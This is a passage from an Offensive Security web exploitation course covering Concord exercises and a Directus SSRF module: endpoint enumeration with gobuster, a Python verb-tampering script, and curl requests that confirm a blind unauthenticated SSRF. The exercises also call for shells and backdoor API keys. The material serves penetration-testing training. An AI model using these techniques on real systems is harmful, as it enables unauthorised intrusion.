Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
435 
 
Figure 306: Successful Login 
Using the API key, we were able to log in! 
11.3.1.1 Exercises 
1. 
Attempt to use the first API key in Concord 1.43.0. Why doesn’t it work in 1.83.0? 
2. 
Explain how Concord hashes API keys before they are stored. 
3. 
Review v0.70.0.xml and discover any entries. 
4. 
Obtain RCE with a curl request using the newly-discovered API key. 
5. 
In the course wiki, we provide an encrypted value. This value was encrypted using the OffSec 
org and the AWAE project in Concord 1.43.0. Using a Concord process, decrypt this value. 
11.3.1.2 Extra Mile 
Since the Authorization header is allowed in the CORS requests, we would be able to send 
authenticated requests through a user’s browser if we don’t have network access to the 
application. Return to the old version of Concord and create a CORS payload using the 
Authorization header and the credentials we’ve discovered. This payload should create a new 
Admin user, generate a new API key as a back door, and obtain a shell. 
11.4 Wrapping Up 
Remote code execution vulnerabilities in a workflow server can be devastating to an organization. 
If the workflow server is the central repository for running all environments of an application, then 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
436 
the server would most likely contain passwords, keys, and other secrets that could lead to 
complete compromise of the enterprise. 
With recent browser security improvements, CSRF and session riding vulnerabilities are 
becoming harder to exploit. However, an attacker can still exploit them since organizations are 
slow (or unable) to update to newer browsers, or they implement overly-permissive CORS headers 
to weaken the browser’s default protection. As shown in this module, multiple vulnerabilities may 
be chained to create a stable CSRF exploit. 
In this module, we demonstrated that even if browsers eradicate CSRF vulnerabilities completely, 
applications might contain multiple authentication bypass vulnerabilities. Supporting files, like 
migration files, can provide a significant amount of information about the application or, as 
shown in Concord, even contain default credentials to access the application. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
437 
11.4.1.1.1 
 
12 Server Side Request Forgery 
In this module, we’ll present a black-box methodology for testing microservices behind an API 
gateway, starting with the discovery and exploitation of a Server Side Request Forgery (SSRF) 
vulnerability in Directus v9.0.0 rc34. We will use this vulnerability to discover more information 
about the environment and chain together vulnerabilities to gain remote code execution. 
The SSRF was discovered by Offensive Security and disclosed to the Directus team for 
remediation. 
12.1 Getting Started 
Before we begin, let’s discuss some basic setup and configuration details. 
In order to access the API Gateway server, we have created a hosts file entry named “apigateway” 
on our Kali Linux VM. Make this change with the corresponding IP address on your Kali machine 
to follow along. Be sure to revert the API Gateway virtual machine from your student control panel 
before starting your work. Please refer to the Wiki for API Gateway box credentials. 
We will be operating from a black-box perspective in this module so we will not use application 
credentials. However, we can use the SSH credentials to restart services on the remote targets if 
necessary. With our setup complete, we can begin testing the API environment. 
12.2 Introduction to Microservices 
With the adoption of Agile249 software development, some development teams have moved away 
from monolithic web applications in favor of many smaller (“micro”) web services. These services 
provide data to users or execute actions on their behalf. 
The term microservice250 can refer to these individual services or to the architectural pattern of 
decomposing applications into multiple small or single-function modules. 
When well-coded, microservices provide the basic required functionality without dependencies. 
Because of this, developers can create and deploy the individual services independently. Multiple 
applications or users can leverage the services without having to re-implement functionality. 
For example, an e-commerce website might provide individual microservices for Auth, Users, 
Carts, Products, and Checkout. The developers working on the Products service can update their 
application without needing to redeploy the entire website. The Products service could even use 
its own database backend. 
 
249 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Agile_software_development 
250 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Microservices 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
438 
12.2.1.1.1 
 
An enterprise architect at a Fortune 100 retail organization described their e-
commerce platform as “A customer sees our website as a single application but 
it is actually over 50 products that make up the site.” 
In this type of environment, microservices are often run in containers and must 
intercommunicate. Since containers and their IP addresses are ephemeral, they often rely on DNS 
for service discovery. In a common example, Docker networks created with Compose treat each 
container’s name as their hostname for networking purposes. Applications running in Docker 
containers can then connect to each other based on those hostnames without needing to include 
IP addresses in their configurations. There are many other software solutions that can aid in 
service discovery by acting as a service registry but we will not go in to those details here. 
Each microservice module exposes its functionality via an API. When an API is exposed over 
HTTP or HTTPS, it is called a web service. There are two common types of web services: SOAP251 
and RESTful.252 We’ll focus on the more-common RESTful web services in this module. 
Developers often use the terms web service, microservice, web API, and API 
interchangeably when referring to web services. 
Rather than expose microservices directly on the Internet, an API gateway253 acts as a single point 
of entry to the service. Since API gateways often provide controls (such as authentication, rate 
limiting, input validation, TLS, etc), the microservices often do not implement those controls 
independently. In these cases, if we can somehow bypass the API gateway, we could subvert 
these controls or even call backend services without authenticating. 
However, before we jump in to potential attack vectors, let’s take some time to discuss web 
service URL formats, which will provide a baseline for service enumeration. 
API gateways can also implement security controls (such as input validation or 
TLS). While an API gateway may require HTTPS traffic from external 
connections, sometimes they are configured to terminate encrypted traffic and 
use cleartext HTTP when they send data to internal services, as that traffic 
traverses what is considered an internal or trusted network. 
12.2.2 Web Service URL Formats 
Each API gateway routes requests to service endpoints in different ways, but URLs are often 
analyzed with regular expressions. For example, an API gateway might be configured to send any 
URI that starts with /user to a specific service. The service itself would be responsible for 
determining the difference between something like /user and /user/new. 
 
251 (Wikipedia, 2021), https://en.wikipedia.org/wiki/SOAP 
252 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Representational_state_transfer#Applied_to_web_services 
253 (Chris Richardson, 2020) https://microservices.io/patterns/apigateway.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
439 
There are a variety of RESTful web service URL formats and we’ll cover a few of them. 
Let’s start by examining a sample call from Best Buy’s APIs.254 
 
Figure 307: Example API call to Best Buy’s Products API 
The Products API has an API-specific subdomain. This is followed by “v1”. APIs will often have 
some way to call a specific “version” to allow for changes without breaking existing integrations. 
In this case, the versioning is specified in the URL. This is a common design pattern, but there are 
others.255 
The next part of the URL is “products”, which is the service called in this example. Following that 
is “8880044.json”, which denotes the requested SKU and data format. 
Depending on the API, we can often request different data formatting, such as 
XML or JSON, by changing the value in the “Accept” header on an HTTP request. 
However, some APIs will ignore this header and always return data in one format. 
Next, let’s examine an API with a different setup, specifically the API for haveibeenpwned.com.256 
GET https://haveibeenpwned.com/api/v3/{service}/{parameter} 
Listing 485 - Basic format of Have I Been Pwned’s API 
Unlike our previous example, this API is called from the main domain. The URL contains “api” in 
the path, followed by the version number. Next, the URL path includes a service name and a 
parameter. 
Finally, let’s check out GitHub’s API URL format.257 
https://api.github.com/users/octocat 
 
254 (Best Buy, 2021), https://bestbuyapis.github.io/api-documentation/#create-your-first-query 
255 (Troy Hunt, 2014), https://www.troyhunt.com/your-api-versioning-is-wrong-which-is/ 
256 (Troy Hunt, 2021), https://haveibeenpwned.com/API/v3#Authorisation 
257 (GitHub Inc, 20201), https://docs.github.com/en/rest/overview/resources-in-the-rest-api 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
440 
Listing 486 - Sample GitHub API URL 
GitHub hosts their APIs on a subdomain. There is no versioning in the URL path. Instead, the API 
provides a default version unless one is specified in a request header. 
By default, all requests to https://api.github.com receive the v3 version of the 
REST API. We encourage you to explicitly request this version via the Accept 
header. 
The remainder of the URL path follows the pattern of a service (or resource) and a parameter, in 
this case “users” and “octocat”, respectively. 
Not every web service we encounter will match these patterns and we cannot review every 
possible format. However, these examples provide a generalized understanding of web service 
URL patterns that can help us with testing web services. 
12.3 API Discovery via Verb Tampering 
RESTful APIs often tie functionality to HTTP request methods,258 or verbs. In other words, a 
service might have one URL but perform different actions based on an HTTP request’s method. 
An HTTP request sent with the GET method is meant to retrieve data or an object. This method is 
sometimes referred to as a safe method since it should not modify the state of an object. 
However, applications can intentionally break this pattern. 
As if the terminology used for web services wasn’t confusing enough, a method 
can also refer to an individual operation in a SOAP web service. For example, 
“lookupUser” and “updateUser” might be individual methods of a Users SOAP 
web service. All SOAP requests are usually sent with an HTTP POST request. 
A POST request usually creates a new object or new data. A PUT or PATCH request updates the 
data of an existing object. Applications might handle these two verbs differently, but a PUT 
request usually updates an entire object while a PATCH request updates a subset of an object. 
Finally, a DELETE request deletes an object. Alternatively, some web services may handle a delete 
operation in a POST request coupled with certain parameters. 
It is important to remember that all of this is application-specific. A RESTful web service might 
not implement everything according to the REST standard. Additionally, a service endpoint might 
not support every HTTP method. We need to keep this in mind as we interact with unknown web 
services. Regular enumeration tools normally send GET requests. These tools might miss API 
endpoints that do not respond to GET requests. 
12.3.1 Initial Enumeration 
Armed with a foundational understanding of web service URL formats, let’s discuss service 
discovery. We’ll begin by sending an HTTP request to our API gateway server with curl. 
 
258 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
441 
kali@kali:~$ curl -i http://apigateway:8000 
HTTP/1.1 404 Not Found 
Date: Thu, 25 Feb 2021 14:58:05 GMT 
Content-Type: application/json; charset=utf-8 
Connection: keep-alive 
Content-Length: 48 
X-Kong-Response-Latency: 1 
Server: kong/2.2.1 
 
{"message":"no Route matched with those values"} 
Listing 487 - An HTTP response from the API Gateway 
The server responded with a 404 Not Found and included the Server header with a value of 
“kong/2.2.1”. A Google search suggests we are likely dealing with Kong Gateway version 2.2.1.259 
According to the documentation,260 it has an Admin API that runs on port 8001. However, an 
attempt to access that port fails. 
kali@kali:~$ curl -i  http://apigateway:8001 
curl: (7) Failed to connect to apigateway port 8001: Connection refused 
Listing 488 - Attempting to access the Kong Admin API. 
We will come back to the Kong Admin API later in the module. For now, let’s try to find some valid 
API endpoints on the server by running gobuster. We are using gobuster because it will show us 
results based on a configurable list of HTTP status codes. An API might return an HTTP 405 
Method Not Allowed response to a GET request. Configuring gobuster to display such a response 
can help us identify API endpoints that are valid but do not allow GET requests. We’ll use the dir 
command to bruteforce directories, -w to define the wordlist, and -u to define the URL. We’ll also 
pass in a custom list of status codes with the -s flag, adding 405 and 500 to the default list. This 
scan may take several minutes to complete. 
kali@kali:~$ gobuster dir -u http://apigateway:8000 -w 
/usr/share/wordlists/dirbuster/directory-list-1.0.txt -s 
"200,204,301,302,307,401,403,405,500" 
=============================================================== 
Gobuster v3.0.1 
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) 
=============================================================== 
[+] Url:            http://apigateway:8000 
[+] Threads:        10 
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
[+] Status codes:   200,204,301,302,307,401,403,405,500 
[+] User Agent:     gobuster/3.0.1 
[+] Timeout:        10s 
=============================================================== 
2021/02/25 09:59:59 Starting gobuster 
=============================================================== 
/files (Status: 403) 
/fileschanged (Status: 403) 
/userscripts (Status: 403) 
/filescan (Status: 403) 
 
259 (Kong Inc, 2021), https://konghq.com/kong/ 
260 (Kong Inc, 2021), https://docs.konghq.com/gateway-oss/2.3.x/admin-api/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
442 
/files2 (Status: 403) 
/filesystem (Status: 403) 
/filesharing (Status: 403) 
/usersguide (Status: 403) 
/filesystems (Status: 403) 
/usersamples (Status: 403) 
/rendering-arbitrary-objects-with-nevow-cherrypy (Status: 401) 
/filesharing_microsoft (Status: 403) 
/filesfoldersdisks (Status: 403) 
/usersdomains (Status: 403) 
/files-needed (Status: 403) 
/renderplain (Status: 401) 
/userscience (Status: 403) 
/files_and_dirs (Status: 403) 
/filesearchen (Status: 403) 
/render (Status: 401) 
/users_watchdog (Status: 403) 
/filescavenger (Status: 403) 
/filescavenger-811-421200 (Status: 403) 
/filescavban (Status: 403) 
/filescavenger-803-406688 (Status: 403) 
/filescavenger-803-404384 (Status: 403) 
/filesizeicon (Status: 403) 
/users-ironpython (Status: 403) 
/render_outline_to_html (Status: 401) 
=============================================================== 
2021/02/25 10:10:13 Finished 
=============================================================== 
Listing 489 - Running gobuster on the target server 
This returns quite a few results. Most of them are 403 Forbidden, but there are a few 401 
Unauthorized. Even though we didn’t get any 200 OK responses, the responses we did get can tell 
us about the environment we’re testing. These responses may indicate valid API endpoints that 
require authentication. Let’s store them in a text file so we can use the results in other tools, such 
as Burp Suite. We’ll copy and paste them into a text file, sort them alphabetically, remove the 
status codes, remove the leading forward slash, and save the results to a new text file. 
kali@kali:~$ sort endpoints.txt | cut -d" " -f1 | cut -d"/" -f2 > endpoints_sorted.txt  
 
kali@kali:~$ cat endpoints_sorted.txt 
files2 
files_and_dirs 
filescan 
filescavban 
filescavenger-803-404384 
filescavenger-803-406688 
filescavenger-811-421200 
filescavenger 
fileschanged 
filesearchen 
filesfoldersdisks 
filesharing_microsoft 
filesharing 
filesizeicon 
files-needed 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
443 
files 
filesystems 
filesystem 
rendering-arbitrary-objects-with-nevow-cherrypy 
render_outline_to_html 
renderplain 
render 
usersamples 
userscience 
userscripts 
usersdomains 
usersguide 
users-ironpython 
users_watchdog 
Listing 490 - Sorted results 
Let’s get these results into Burp Suite. We could have proxied gobuster through Burp Suite during 
the initial discovery scan, but that would have filled the HTTP history tab with lots of extraneous 
data. Now that we have a shorter list of endpoints we are interested in, we can run gobuster again 
using the sorted endpoints as our wordlist, and proxy the calls through Burp Suite with the --
proxy flag once Burp Suite is running. 
kali@kali:~$ gobuster dir -u http://apigateway:8000 -w endpoints_sorted.txt --proxy 
http://127.0.0.1:8080 
=============================================================== 
Gobuster v3.0.1 
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) 
=============================================================== 
[+] Url:            http://apigateway:8000 
[+] Threads:        10 
[+] Wordlist:       endpoints_sorted.txt 
[+] Status codes:   200,204,301,302,307,401,403 
[+] Proxy:          http://127.0.0.1:8080 
[+] User Agent:     gobuster/3.0.1 
[+] Timeout:        10s 
=============================================================== 
2021/02/25 10:28:08 Starting gobuster 
=============================================================== 
... 
=============================================================== 
2021/02/25 10:28:09 Finished 
=============================================================== 
Listing 491 - Proxying gobuster through Burp Suite 
Let’s start analyzing the results by clicking on Status to sort them by status code. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
444 
 
Figure 308: Initial enumeration results in Burp Suite 
We have four results that returned 401 Forbidden responses. In fact, those four responses are 
almost identical, and only the value in the X-Kong-Response-Latency header changes. 
HTTP/1.1 401 Unauthorized 
Date: Thu, 25 Feb 2021 15:28:08 GMT 
Content-Type: application/json; charset=utf-8 
Connection: close 
WWW-Authenticate: Key realm="kong" 
Content-Length: 45 
X-Kong-Response-Latency: 0 
Server: kong/2.2.1 
 
{ 
  "message":"No API key found in request" 
} 
Listing 492 - Sample HTTP 401 response 
Based on the /render URL paths prefix and the response body content, the API gateway might be 
routing these four requests to the same backend service. All four responses included a WWW-
Authenticate header with a value of Key realm=“kong”, which means we will likely need some kind 
of API key to call this service. 
The responses for URL paths prefixed with /users and /files are very similar. They return HTTP 
403 Forbidden responses with slight length variations. Let’s examine one of the responses for a 
request starting with /users. 
HTTP/1.1 403 Forbidden 
Content-Type: application/json; charset=utf-8 
Content-Length: 131 
Connection: close 
X-Powered-By: Directus 
Vary: Origin 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: Content-Range 
ETag: W/"83-QQac6ttqCuyHQKqtWPBHLcfwFfM" 
Date: Thu, 25 Feb 2021 15:28:09 GMT 
X-Kong-Upstream-Latency: 93 
X-Kong-Proxy-Latency: 0 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
445 
Via: kong/2.2.1 
 
{"errors":[{"message":"You don't have permission to access the \"directus_users\" 
collection.","extensions":{"code":"FORBIDDEN"}}]} 
Listing 493 - Sample HTTP 403 Forbidden response 
These responses provide us some additional information. We notice the X-Powered-By header 
with the “Directus” value and an error message: “You don’t have permission to access the 
"directus_users" collection”. The common value in the URL for these requests is /users. 
The response for URL paths starting with /files generates a slightly different error message 
(referencing the "directus_files" collection), but are otherwise identical. 
Based on the X-Powered-By server header, we are dealing with a Directus application.261 A quick 
online search reveals that Directus is “an instant app and API for your SQL database.” This 
information will prove useful later on but we will continue assessing this server from a black box 
perspective. 
From our initial list of 29 URLs, we seem to have three distinct endpoints: files, users, and render. 
Let’s save these three endpoints in a new file named endpoints_simple.txt. 
12.3.1.1 Exercise 
Repeat the steps so far. 
12.3.2 Advanced Enumeration with Verb Tampering 
Now that we have three potential API services, let’s do another round of enumeration. URLs for 
RESTful APIs often follow a pattern of <object>/<action> or <object>/<identifier>. We might be 
able to discover more services by taking the list of endpoints we have already identified and 
iterating through a wordlist to find valid actions or identifiers. 
We also need to keep in mind that web APIs might respond differently based on which HTTP 
request method we use. For example, a GET request to /auth might return an HTTP 404 
response, while a POST request to the same URL returns an HTTP 200 OK on a valid login or an 
HTTP 401 Unauthorized on an invalid login attempt. 
We can use the varying HTTP method response codes to identify more API endpoints. Gobuster 
can be configured to send HTTP methods other than GETs, but it will use the configured HTTP 
method on all requests. It does not send multiple HTTP methods in the same scan. In other 
words, if we configure it to send POST requests, Gobuster will only send POST requests and will 
not send GET requests. If we want to send different HTTP request methods to an endpoint and 
compare the response codes, we will need a different tool. 
Let’s create a Python script that will send requests with different HTTP methods to a list of 
endpoints. The script will iterate through the endpoints and check the response codes for each 
request. The script will print out any endpoint that has a response other than 401, 403, or 404. 
 
261 (Monospace Inc, 2020), https://directus.io/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
446 
We will start our script with the shebang262 and two import statements. We will use argparse to 
handle input arguments and requests to handle sending the HTTP requests. We’ll save the final 
script to a file named route_buster.py. 
#!/usr/bin/env python3 
 
import argparse 
import requests 
Listing 494 - Import statements 
Next, we need to define argument parsing and handling. We need one argument for the target 
host. Our script will be using two word lists: one for objects (or base endpoints) and another 
argument for actions. We’ll add two more arguments for our wordlists. 
parser = argparse.ArgumentParser() 
parser.add_argument('-a','--actionlist', help='actionlist to use') 
parser.add_argument('-t','--target', help='host/ip to target', required=True) 
parser.add_argument('-w','--wordlist', help='wordlist to use') 
args = parser.parse_args() 
Listing 495 - Handling arguments 
Our script will need to iterate through the entire “actionlist” for each endpoint in the wordlist. While 
not strictly important, we can avoid reading the “actionlist” file repeatedly by reading it once and 
keeping it in memory as a list. 
actions = [] 
 
with open(args.actionlist, "r") as a: 
    for line in a: 
        try: 
            actions.append(line.strip()) 
        except: 
            print("Exception occurred") 
Listing 496 - Storing the actionlist file contents in memory 
Our final step is to send the requests and inspect the response codes. We will need to iterate 
through the endpoint wordlist, construct the URLs we want to request, and send the requests. The 
script will print out any URL that generated a response other than 204, 401, 403, or 404. 
print("Path                - \tGet\tPost") 
with open(args.wordlist, "r") as f: 
    for word in f: 
        for action in actions: 
            print('\r/{word}/{action}'.format(word=word.strip(), action=action), 
end='') 
             
            url = "{target}/{word}/{action}".format(target=args.target, 
word=word.strip(), action=action) 
             
            r_get = requests.get(url=url).status_code 
            r_post = requests.post(url=url).status_code 
 
 
262 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Shebang_(Unix) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
447 
            if(r_get not in [204,401,403,404] or r_post not in [204,401,403,404]): 
                print('                    \r', end='') 
                print("/{word}/{action:10} - 
\t{get}\t{post}".format(word=word.strip(), action=action, get=r_get, post=r_post)) 
 
print('\r', end='') 
print("Wordlist complete. Goodbye.") 
Listing 497 - route_buster.py 
Next, let’s focus on our two wordlists. We’ll use the discovered endpoints as the objects list, and 
one of dirb’s wordlists as the second list. Currently, the script will only send GET and POST 
requests. We might be missing endpoints by omitting PUT, PATCH, and DELETE requests but we 
are trying to strike a balance between speed, noise, and effectiveness. Depending on the results 
of the script, we may need to revisit the decision to exclude those methods. 
Let’s run the script against the target server. It may take several minutes to complete. 
kali@kali:~$ ./route_buster.py -a /usr/share/wordlists/dirb/small.txt -w 
endpoints_simple.txt -t http://apigateway:8000 
Path                -   Get     Post 
/files/import     -     403     400 
/users/frame      -     200     404 
/users/home       -     200     404 
/users/invite     -     403     400 
/users/readme     -     200     404 
/users/welcome    -     200     404 
/users/wellcome   -     200     404 
Wordlist complete. Goodbye. 
Listing 498 - Results of the route_buster.py script 
While we had several 200 OK responses to the GET requests, those URLs don’t respond with 
anything interesting when loaded in a browser. However, we do have two interesting results from 
the script. When the script sent POST requests to /files/import and /users/invite, the server 
responded with HTTP 400 Bad Request instead of HTTP 403 Forbidden. 
Let’s focus on the /files/import endpoint first and send a POST request to it using curl. We will 
set the -i flag to include the server headers on the response in the output. 
kali@kali:~$ curl -i -X POST http://apigateway:8000/files/import 
HTTP/1.1 400 Bad Request 
Content-Type: application/json; charset=utf-8 
Content-Length: 86 
Connection: keep-alive 
X-Powered-By: Directus 
Vary: Origin 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: Content-Range 
ETag: W/"56-egVc9WbgXViwv0ZIaPJS4bmcvSo" 
Date: Thu, 25 Feb 2021 16:06:54 GMT 
X-Kong-Upstream-Latency: 26 
X-Kong-Proxy-Latency: 0 
Via: kong/2.2.1 
 
{"errors":[{"message":"\"url\" is required","extensions":{"code":"INVALID_PAYLOAD"}}]} 
Listing 499 - Response for a POST request to /files/import 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
448 
We seem to have found an API endpoint that we can interact with (even though we have not 
authenticated) and it provides usage information. The error message states that a “url is 
required”. This is a promising lead. Any time we discover an API or web form that includes a url 
parameter, we always want to check it for a Server-Side Request Forgery vulnerability. We’ll 
discuss this in the next section. 
12.3.2.1 Exercise 
Recreate the steps in this section. 
12.3.2.2 Extra Mile 
1. 
Expand the route_buster.py script to include PUT and PATCH methods. 
2. 
Investigate the /users/invite endpoint. What information are we missing to make a valid 
request? 
12.4 Introduction to Server-Side Request Forgery 
Server-Side Request Forgery (SSRF) occurs when an attacker can force an application or server to 
request data or a resource. Since the request is originating at the server, it might be able to 
access data that the attacker cannot access directly. The server may also have access to 
services running on localhost interfaces or other servers behind a firewall or reverse proxy. 
The impact of an SSRF vulnerability depends on what data it can access and whether the SSRF 
returns any resulting data to the attacker. However, SSRF vulnerabilities can be especially 
effective against microservices. As we previously discussed, microservices will often have fewer 
security controls in place if they rely upon an API gateway or reverse proxy to implement those 
controls. If the microservices are in a flat network, we could use an SSRF vulnerability to make 
one microservice talk directly to another microservice. Any controls enforced by the API gateway 
would not apply to the traffic between the two microservices, allowing an SSRF exploit to gather 
information about the internal network and open new attack vectors on that network. 
12.4.1 Server-Side Request Forgery Discovery 
Let’s determine if this application contains SSRF. 
After fuzzing the APIs, we have identified that /files/import returned an error message that 
indicates we need to include a url parameter. 
{"errors":[{"message":"\"url\" is required","extensions":{"code":"INVALID_PAYLOAD"}}]} 
Listing 500 - Error message response from /files/import 
As we mentioned, we always want to check url parameters in an API or web form for an SSRF 
vulnerability. First, let’s determine if we can make it connect back to our Kali machine. We’ll need 
to make sure our Apache HTTP server is running. 
Since the server returned the error as a JSON message, let’s make our POST request use JSON 
as well. We will use a distinct file name on the url parameter so it is easy to find in our Apache log 
file. At this point, we don’t care if the file actually exists on our Kali host, we just want to determine 
if the API server will request the file from our web server. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
449 
Let’s send our payload using curl. We will set -H “Content-Type: application/json” to 
include a Content-Type header with the “application/json” value on our request and the -d flag 
with our JSON payload. 
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d 
'{"url":"http://192.168.118.3/ssrftest"}' http://apigateway:8000/files/import 
HTTP/1.1 500 Internal Server Error 
Content-Type: application/json; charset=utf-8 
Content-Length: 108 
Connection: keep-alive 
X-Powered-By: Directus 
Vary: Origin 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: Content-Range 
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc" 
Date: Thu, 25 Feb 2021 16:18:24 GMT 
X-Kong-Upstream-Latency: 118 
X-Kong-Proxy-Latency: 1 
Via: kong/2.2.1 
 
{"errors":[{"message":"Request failed with status code 
404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
Listing 501 - Attempting an SSRF exploit 
We receive an HTTP 500 response with a message of “Request failed with status code 404”. Let’s 
check our Apache log for any requests. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
192.168.120.135 - - [25/Feb/2021:11:18:24 -0500] "GET /ssrftest HTTP/1.1" 404 455 "-" 
"axios/0.21.1" 
Listing 502 - Verifying the SSRF worked in our Apache log file 
Excellent. This backend service is vulnerable to SSRF. The user agent on the request is Axios,263 
an HTTP client for Node.js. Let’s add a file named ssrftest to our Apache web root so that the 
server can access it and then resend the request with curl. 
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d 
'{"url":"http://192.168.118.3/ssrftest"}' http://apigateway:8000/files/import 
HTTP/1.1 403 Forbidden 
Content-Type: application/json; charset=utf-8 
Content-Length: 102 
Connection: keep-alive 
X-Powered-By: Directus 
Vary: Origin 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: Content-Range 
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao" 
Date: Thu, 25 Feb 2021 16:22:52 GMT 
X-Kong-Upstream-Latency: 117 
X-Kong-Proxy-Latency: 0 
Via: kong/2.2.1 
 
 
263 (John Jakob Sarjeant, 2020), https://axios-http.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
450 
{"errors":[{"message":"You don't have permission to access 
this.","extensions":{"code":"FORBIDDEN"}}]} 
Listing 503 - Resending the request with a valid file 
We received an HTTP 403 Forbidden response with an error message of “You don’t have 
permission to access this”. However, when we check our Apache log file, we can verify the 
application did send a request and our Apache server returned an HTTP 200 OK. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
192.168.120.135 - - [25/Feb/2021:11:18:24 -0500] "GET /ssrftest HTTP/1.1" 404 455 "-" 
"axios/0.21.1" 
192.168.120.135 - - [25/Feb/2021:11:22:52 -0500] "GET /ssrftest HTTP/1.1" 200 230 "-" 
"axios/0.21.1" 
Listing 504 - Apache returned a 200 
We definitely have an unauthenticated SSRF vulnerability, but the server does not return the result 
of the forged request. This is often referred to as a blind SSRF vulnerability. 
12.4.1.1 Exercise 
Recreate the steps above. 
12.4.2 Source Code Analysis 
Before we continue with our attack, let’s review the source code since Directus is open source. 
While we are approaching this module from a black box perspective, it is still important to 
understand what is happening in the application’s code that allows this vulnerability. We want to 
be able to take what we’ve learned about this particular vulnerability and apply it to other 
applications by understanding the root cause of this bug. 
The source code referenced in this section is also available from the course Wiki. 
Let’s 
start 
with 
authentication. 
The 
authentication 
handler 
is 
defined 
in 
/api/src/middleware/authenticate.ts. The relevant code is on lines 12 through 21.264 
12  const authenticate: RequestHandler = asyncHandler(async (req, res, next) => { 
13    req.accountability = { 
14      user: null, 
15      role: null, 
16      admin: false, 
17      ip: req.ip.startsWith('::ffff:') ? req.ip.substring(7) : req.ip, 
18      userAgent: req.get('user-agent'), 
19    }; 
20   
21    if (!req.token) return next(); 
22   
23    if (isJWT(req.token)) { 
Listing 505 - Code excerpt from Directus authentication handler 
 
264 (GitHub, 2021), https://github.com/directus/directus/blob/v9.0.0-rc.34/api/src/middleware/authenticate.ts 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
451 
On lines 13 through 19, the function creates a new accountability object on the request. Notably, 
the user and role variables are set to null. The function then checks if there is a token on the 
request object. If there is no token, the function returns next(), which passes execution on to the 
next middleware function. 
If we make a request without a token, the authentication handler will create the default 
accountability object and then pass execution to the next middleware function without throwing 
an error. 
Next, let’s review the code for the files controller defined in /api/src/controllers/files.ts.265 The 
relevant code starts on line 138. 
138  router.post( 
139    '/import', 
140    asyncHandler(async (req, res, next) => { 
141      const { error } = importSchema.validate(req.body); 
142   
143      if (error) { 
144        throw new InvalidPayloadException(error.message); 
145      } 
146   
147      const service = new FilesService({ 
148        accountability: req.accountability, 
149        schema: req.schema, 
150      }); 
Listing 506 - Code excerpt from Directus files controller 
The function starts by validating the request body and throwing an error if the body is invalid. 
Next, the code creates a FileService object with the accountability object created by the 
authentication handler. Although we won’t inspect the code of the FileService object, the 
constructor merely stores the accountability object. 
152      const fileResponse = await axios.get<NodeJS.ReadableStream>(req.body.url, { 
153        responseType: 'stream', 
154      }); 
155   
156      const parsedURL = url.parse(fileResponse.request.res.responseUrl); 
157      const filename = path.basename(parsedURL.pathname as string); 
158   
159      const payload = { 
160        filename_download: filename, 
161        storage: toArray(env.STORAGE_LOCATIONS)[0], 
162        type: fileResponse.headers['content-type'], 
